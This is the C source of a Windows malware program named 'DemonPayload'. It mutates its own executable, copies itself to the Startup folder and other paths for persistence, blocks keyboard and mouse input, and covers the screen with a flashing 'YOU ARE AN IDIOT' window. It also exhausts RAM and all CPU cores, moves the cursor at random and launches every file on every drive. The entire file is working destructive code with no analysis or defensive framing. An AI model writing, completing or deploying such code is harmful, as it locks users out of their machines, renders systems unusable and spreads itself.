#include <windows.h>
#include <mmsystem.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>

#pragma comment(lib, "winmm.lib")

// --- Polymorphic self-mutation ---
void PolymorphSelf() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    FILE *f = fopen(path, "rb+");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    BYTE *buf = (BYTE *)malloc(size);
    fread(buf, 1, size, f);

    // XOR mutate a section (example: bytes 0x200 to 0x300)
    for (int i = 0x200; i < 0x300 && i < size; i++) {
        buf[i] ^= (BYTE)(rand() % 256);
    }

    rewind(f);
    fwrite(buf, 1, size, f);
    fclose(f);
    free(buf);
}

// --- Flash toggle for window background ---
int flash = 0;

// --- RAM eater thread ---
DWORD WINAPI EatRAM(LPVOID lpParam) {
    while (1) {
        void* mem = malloc(1024 * 1024 * 100); // 100MB
        if (!mem) break;
        memset(mem, 0, 1024 * 1024 * 100);
        Sleep(1000);
    }
    return 0;
}

// --- CPU burner thread ---
DWORD WINAPI BurnCPU(LPVOID lpParam) {
    while (1) {
        volatile double x = 0;
        for (int i = 0; i < 1000000; i++) x += i * 1.01;
    }
    return 0;
}

// --- Mouse mover thread ---
DWORD WINAPI MoveMouse(LPVOID lpParam) {
    while (1) {
        int x = rand() % GetSystemMetrics(SM_CXSCREEN);
        int y = rand() % GetSystemMetrics(SM_CYSCREEN);
        SetCursorPos(x, y);
        Sleep(1000);
    }
    return 0;
}

// --- Self-replication ---
void DropClones() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);

    const char* dirs[] = {
        "C:\\Users\\Public\\Music\\doom.exe",
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\sus.exe",
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hellspawn.exe",
        "C:\\Windows\\Temp\\demonchild.exe"
    };

    for (int i = 0; i < sizeof(dirs)/sizeof(dirs[0]); i++) {
        char dest[MAX_PATH];
        ExpandEnvironmentStringsA(dirs[i], dest, MAX_PATH);
        CopyFileA(path, dest, FALSE);
    }
}

// --- Open all files recursively ---
void OpenAllFiles(LPCTSTR rootPath) {
    TCHAR searchPath[MAX_PATH];
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    _stprintf(searchPath, _T("%s\\*"), rootPath);
    hFind = FindFirstFile(searchPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (_tcscmp(findFileData.cFileName, _T(".")) == 0 || _tcscmp(findFileData.cFileName, _T("..")) == 0)
            continue;

        TCHAR fullPath[MAX_PATH];
        _stprintf(fullPath, _T("%s\\%s"), rootPath, findFileData.cFileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            OpenAllFiles(fullPath);
        } else {
            ShellExecute(NULL, _T("open"), fullPath, NULL, NULL, SW_HIDE);
            Sleep(10);
        }

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// --- Open all files on all mounted drives ---
void OpenAllDrives() {
    DWORD drives = GetLogicalDrives();
    for (char letter = 'A'; letter <= 'Z'; letter++) {
        if (drives & (1 << (letter - 'A'))) {
            char root[4] = { letter, ':', '\\', '\0' };
            OpenAllFiles(root);
        }
    }
}

// --- Window procedure ---
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_DESTROY:
        BlockInput(FALSE); // unlock input on close
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// --- Entry point ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {

    srand(GetTickCount());

    PolymorphSelf();

    const char CLASS_NAME[] = "DemonPayload";
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        CLASS_NAME,
        "YOU ARE AN IDIOT",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL
    );

    BlockInput(TRUE);

    PlaySound(TEXT("youareanidiot.wav"), NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);

    CreateThread(NULL, 0, MoveMouse, NULL, 0, NULL);
    CreateThread(NULL, 0, EatRAM, NULL, 0, NULL);

    SYSTEM_INFO sysinfo;
    GetSystemInfo(&sysinfo);
    for (int i = 0; i < sysinfo.dwNumberOfProcessors; i++) {
        CreateThread(NULL, 0, BurnCPU, NULL, 0, NULL);
    }

    DropClones();

    OpenAllDrives();

    // Flashing red-black screen loop
    while (1) {
        HDC hdc = GetDC(hwnd);
        HBRUSH brush = CreateSolidBrush(flash ? RGB(255, 0, 0) : RGB(0, 0, 0));
        RECT rect;
        GetClientRect(hwnd, &rect);
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        ReleaseDC(hwnd, hdc);
        flash = !flash;
        Sleep(300);
    }

    return 0;
}
